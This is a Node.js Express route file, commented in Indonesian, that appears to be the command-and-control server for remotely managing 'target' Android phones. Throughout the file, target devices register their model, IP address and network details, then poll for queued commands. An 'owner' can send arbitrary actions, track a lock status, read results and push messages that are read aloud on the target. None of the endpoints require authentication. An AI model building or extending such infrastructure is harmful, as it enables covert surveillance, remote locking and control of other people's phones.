// ═══════════════════════════════════════════════
//  CONTROL ROUTES — remote control via server
//  Persistent: pakai file JSON, tidak hilang saat restart
// ═══════════════════════════════════════════════
const express = require('express');
const router  = express.Router();
const fs      = require('fs');
const path    = require('path');

const DATA_DIR      = path.join(__dirname, '../../data');
const CHAT_FILE     = path.join(DATA_DIR, 'control_chat.json');

function loadChat(deviceId) {
  try { return (JSON.parse(require('fs').readFileSync(CHAT_FILE, 'utf8'))[deviceId]) || []; }
  catch { return []; }
}
function saveChat(deviceId, msgs) {
  try {
    let all = {};
    try { all = JSON.parse(require('fs').readFileSync(CHAT_FILE, 'utf8')); } catch {}
    all[deviceId] = msgs.slice(-200);
    require('fs').writeFileSync(CHAT_FILE, JSON.stringify(all));
  } catch {}
}
const DEVICES_FILE  = path.join(DATA_DIR, 'control_devices.json');
const COMMANDS_FILE = path.join(DATA_DIR, 'control_commands.json');
const RESULTS_FILE  = path.join(DATA_DIR, 'control_results.json');

// ── Helper baca/tulis JSON ──────────────────────
function readJSON(file) {
  try {
    if (!fs.existsSync(file)) { fs.writeFileSync(file, '{}'); return {}; }
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch { return {}; }
}
function writeJSON(file, data) {
  try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch {}
}

// ── In-memory cache (sinkron dari file saat mulai) ──
let devices  = readJSON(DEVICES_FILE);
let commands = readJSON(COMMANDS_FILE);
let results  = readJSON(RESULTS_FILE);

function saveAll() {
  writeJSON(DEVICES_FILE,  devices);
  writeJSON(COMMANDS_FILE, commands);
  writeJSON(RESULTS_FILE,  results);
}

// ══════════════════════════════════════════════
//  AGENT endpoints — dipanggil HP target
// ══════════════════════════════════════════════

// POST /api/control/register
router.post('/register', (req, res) => {
  const { device_id, device_target, brand, model, android_ver,
          battery_level, device_ip, network_type, session_key } = req.body;

  if (!device_id) return res.json({ success: false, message: 'device_id required' });

  devices[device_id] = {
    device_id,
    device_target: device_target || `${brand} ${model}`,
    device_model:  model || '',
    device_brand:  brand || '',
    android_ver:   android_ver || '',
    battery_level: battery_level || '?',
    device_ip:     device_ip || '0.0.0.0',
    network_type:  network_type || 'Unknown',
    last_seen:     Date.now(),
    status:        'online',
    lock_status:   results[device_id]?.lock_status || 'unlocked',
    session_key:   session_key || '',
  };

  saveAll();

  const cmd = commands[device_id] || null;
  res.json({ success: true, command: cmd });
});

// POST /api/control/heartbeat
router.post('/heartbeat', (req, res) => {
  const { device_id, battery_level } = req.body;
  if (!device_id) return res.json({ success: false, command: null });

  // Auto-register kalau belum ada
  if (!devices[device_id]) {
    devices[device_id] = {
      device_id,
      device_target: 'Unknown',
      battery_level: battery_level || '?',
      device_ip: '0.0.0.0',
      network_type: 'Unknown',
      last_seen: Date.now(),
      status: 'online',
      lock_status: 'unlocked',
    };
  } else {
    devices[device_id].last_seen     = Date.now();
    devices[device_id].status        = 'online';
    devices[device_id].battery_level = battery_level || devices[device_id].battery_level;
  }

  const cmd = commands[device_id] || null;
  if (cmd) {
    delete commands[device_id]; // hapus setelah dikirim
  }

  saveAll();
  res.json({ success: true, command: cmd });
});

// POST /api/control/result
router.post('/result', (req, res) => {
  const { device_id, field, value } = req.body;
  if (!device_id) return res.json({ success: false });

  if (!results[device_id]) results[device_id] = {};
  results[device_id][field]  = value;
  results[device_id].updated = Date.now();

  // Sync lock_status ke devices
  if (field === 'lock_status' && devices[device_id]) {
    devices[device_id].lock_status = value;
  }

  saveAll();
  res.json({ success: true });
});

// ══════════════════════════════════════════════
//  CONTROLLER endpoints — dipanggil HP owner
// ══════════════════════════════════════════════

// GET /api/control/devices
router.get('/devices', (req, res) => {
  const now  = Date.now();
  // Reload dari file (biar selalu fresh)
  devices = readJSON(DEVICES_FILE);
  const list = Object.values(devices).map(d => ({
    ...d,
    is_online: (now - (d.last_seen || 0)) < 60000, // 60 detik toleransi
  }));
  res.json({ success: true, devices: list });
});

// POST /api/control/send
router.post('/send', (req, res) => {
  const { device_id, action } = req.body;
  if (!device_id || !action) {
    return res.json({ success: false, message: 'device_id & action required' });
  }
  if (!devices[device_id]) {
    return res.json({ success: false, message: 'Device tidak ditemukan atau belum pernah online' });
  }

  commands[device_id] = { action, timestamp: Date.now() };
  saveAll();

  res.json({ success: true, message: `Perintah "${action}" antri untuk ${device_id}` });
});

// GET /api/control/result/:deviceId/:field
router.get('/result/:deviceId/:field', (req, res) => {
  results = readJSON(RESULTS_FILE);
  const { deviceId, field } = req.params;
  const value   = results[deviceId]?.[field] ?? null;
  const updated = results[deviceId]?.updated ?? 0;
  res.json({ success: true, value, updated });
});

// GET /api/control/result/:deviceId — semua hasil
router.get('/result/:deviceId', (req, res) => {
  results = readJSON(RESULTS_FILE);
  const data = results[req.params.deviceId] || {};
  res.json({ success: true, data });
});

// DELETE /api/control/device/:deviceId — hapus device dari list
router.delete('/device/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  if (devices[deviceId]) {
    delete devices[deviceId];
    delete commands[deviceId];
    delete results[deviceId];
    saveAll();
    return res.json({ success: true, message: 'Device dihapus' });
  }
  res.json({ success: false, message: 'Device tidak ditemukan' });
});

// GET /api/control/chat/:deviceId
router.get('/chat/:deviceId', (req, res) => {
  res.json({ success: true, messages: loadChat(req.params.deviceId) });
});

// POST /api/control/chat/:deviceId — owner kirim pesan
router.post('/chat/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { from, message } = req.body;
  if (!message) return res.json({ success: false });
  const msgs = loadChat(deviceId);
  msgs.push({
    id: Date.now(), from: from || 'owner',
    message: String(message).substring(0, 500),
    time: new Date().toTimeString().substring(0, 5),
    timestamp: new Date().toISOString(),
  });
  saveChat(deviceId, msgs);
  // Forward ke target sebagai command TTS
  if (from === 'owner') {
    commands[deviceId] = { action: 'chat_msg:' + message, timestamp: Date.now() };
    writeJSON(COMMANDS_FILE, commands);
  }
  res.json({ success: true });
});

module.exports = router;
